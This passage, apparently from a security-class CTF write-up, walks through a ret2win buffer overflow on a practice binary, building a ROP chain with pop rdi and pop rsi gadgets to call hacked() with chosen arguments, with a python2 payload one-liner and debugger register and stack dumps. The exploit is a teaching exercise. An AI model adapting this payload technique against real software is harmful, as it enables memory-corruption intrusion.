Here we need to pass two params to `hacked()` so we need to push them onto the stack before calling it right.
When we fill the buffer and overflow the stack, we fill data from low adresses (the lower address being the start of the buffer) to high.er addresses.

Let's say we wanna call a function with a specific value: we first fill in the necessary padding so we can overflow, then we fill in the value of the parameter we want to use with the function, and then the address of the function we wanna call with this parameter.
When th e program will execute, RIP will "move" first through the buffer, then into the parameter and then into the address of the function.

So here, we need to fill in data into the program in this order: 
1. the padding full of A's
2. the `pop rdi; ret;` gadget and add extra zeroes to fill the whole 64 bits
3. the value to pop in RDI
4. the `pop rsi; pop r15; ret` gadget (`pop rsi; ret;` alone didnt exist)
5. the value to pop in RSI and right after the value to pop in r15
6. the address of `hacked()`

We can do it full-manually like this:
```bash
$ python2 -c 'print "A" * 24 + "\x4b\x12\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x49\x12\x40\x00\x00\x00\x00\x00" + "\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x42\x11\x40\x00\x00\x00\x00\x00"' > payload
$ ./ret2win_params < payload
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAK@
This function is TOP SECRET! How did you get in here?! :O
[1]    29573 segmentation fault  ./ret2win_params < payload
$
```

When exiting `register_name()` we have a stack that looks like this:

```bash
────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x26              
$rbx   : 0x00007fffffffdc68  →  0x00007fffffffdff1  →  "/home/kali/secu_classes_ctf/classes/cryptocat_bina[...]"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffdb48  →  0x000000000040124b  →  <__libc_csu_init+005b> pop rdi
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00000000004052a0  →  0x6572656874206948 ("Hi there"?)
$rdi   : 0x00007fffffffd950  →  0x00007fffffffd980  →  0x6572656874206948 ("Hi there"?)
$rip   : 0x00000000004011d6  →  <register_name+0046> ret 
$r8    : 0x73              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdc78  →  0x00007fffffffe064  →  "COLORFGBG=15;0"
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb48│+0x0000: 0x000000000040124b  →  <__libc_csu_init+005b> pop rdi        ← $rsp
0x00007fffffffdb50│+0x0008: 0xdeadbeefdeadbeef
0x00007fffffffdb58│+0x0010: 0x0000000000401249  →  <__libc_csu_init+0059> pop rsi
0x00007fffffffdb60│+0x0018: 0xc0debabec0debabe
0x00007fffffffdb68│+0x0020: 0x0000000000000000
0x00007fffffffdb70│+0x0028: 0x0000000000401142  →  <hacked+0000> push rbp
0x00007fffffffdb78│+0x0030: 0x00007fffffffdc00  →  0x00000000004011d7  →  <main+0000> push rbp
0x00007fffffffdb80│+0x0038: 0x00007fffffffdc68  →  0x00007fffffffdff1  →  "/home/kali/secu_classes_ctf/classes/cryptocat_bina[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4011cf <register_name+003f> call   0x401040 <printf@plt>
     0x4011d4 <register_name+0044> nop    
     0x4011d5 <register_name+0045> leave  
●→   0x4011d6 <register_name+0046> ret    
   ↳    0x40124b <__libc_csu_init+005b> pop    rdi
        0x40124c <__libc_csu_init+005c> ret    
        0x40124d                  nop    DWORD PTR [rax]
        0x401250 <__libc_csu_fini+0000> ret    
        0x401251                  add    BYTE PTR [rax], al
        0x401253                  add    BYTE PTR [rax-0x7d], cl
──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x4011d6 in register_name (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4011d6 → register_name()
[#1] 0x40124b → __libc_csu_init()
[#2] 0x401249 → __libc_csu_init()
[#3] 0x401142 → frame_dummy()
[#4] 0x7fffffffdc00 → xlat BYTE PTR ds:[rbx]
[#5] 0x7fffffffdc68 → int1 
```
And then calling `hacked()` our stack looks like this:
```bash
────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x26              
$rbx   : 0x00007fffffffdc68  →  0x00007fffffffdff1  →  "/home/kali/secu_classes_ctf/classes/cryptocat_bina[...]"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffdb70  →  0x0000000000401142  →  <hacked+0000> push rbp
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0xc0debabec0debabe
$rdi   : 0xdeadbeefdeadbeef
$rip   : 0x000000000040124c  →  <__libc_csu_init+005c> ret 
$r8    : 0x73              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdc78  →  0x00007fffffffe064  →  "COLORFGBG=15;0"
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb70│+0x0000: 0x0000000000401142  →  <hacked+0000> push rbp        ← $rsp
0x00007fffffffdb78│+0x0008: 0x00007fffffffdc00  →  0x00000000004011d7  →  <main+0000> push rbp
0x00007fffffffdb80│+0x0010: 0x00007fffffffdc68  →  0x00007fffffffdff1  →  "/home/kali/secu_classes_ctf/classes/cryptocat_bina[...]"
0x00007fffffffdb88│+0x0018: 0x75eab2ba6757f462
0x00007fffffffdb90│+0x0020: 0x0000000000000000
0x00007fffffffdb98│+0x0028: 0x00007fffffffdc78  →  0x00007fffffffe064  →  "COLORFGBG=15;0"
0x00007fffffffdba0│+0x0030: 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
0x00007fffffffdba8│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401246 <__libc_csu_init+0056> pop    r13
     0x401248 <__libc_csu_init+0058> pop    r14
     0x40124a <__libc_csu_init+005a> pop    r15
 →   0x40124c <__libc_csu_init+005c> ret    
   ↳    0x401142 <hacked+0000>    push   rbp
        0x401143 <hacked+0001>    mov    rbp, rsp
        0x401146 <hacked+0004>    sub    rsp, 0x10
        0x40114a <hacked+0008>    mov    QWORD PTR [rbp-0x8], rdi
        0x40114e <hacked+000c>    mov    QWORD PTR [rbp-0x10], rsi
        0x401152 <hacked+0010>    movabs rax, 0xdeadbeefdeadbeef
──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x40124c in __libc_csu_init (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40124c → __libc_csu_init()
[#1] 0x401142 → frame_dummy()
[#2] 0x7fffffffdc00 → xlat BYTE PTR ds:[rbx]
[#3] 0x7fffffffdc68 → int1 
```

The arguments are in RDI and RSI, we now know we can call `hacked()`
